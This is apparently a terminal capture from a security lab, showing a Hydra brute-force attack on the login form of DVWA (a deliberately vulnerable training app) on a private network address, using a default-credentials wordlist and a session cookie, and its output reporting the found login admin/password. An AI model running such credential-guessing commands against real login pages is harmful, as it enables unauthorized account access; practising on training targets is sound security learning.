``` bash
┌──(voldemort@ideapad)-[~]
└─$ hydra -C /usr/share/wordlist/SecLists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt 192.168.0.106 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low; PHPSESSID=6efb72944bc31951707a014d35438e7d:Username and/or password incorrect."



Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-26 11:58:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 132 login tries, ~9 tries per task
[DATA] attacking http-get-form://192.168.0.106:80/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low; PHPSESSID=6efb72944bc31951707a014d35438e7d:Username and/or password incorrect.
[80][http-get-form] host: 192.168.0.106   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-26 11:58:48
```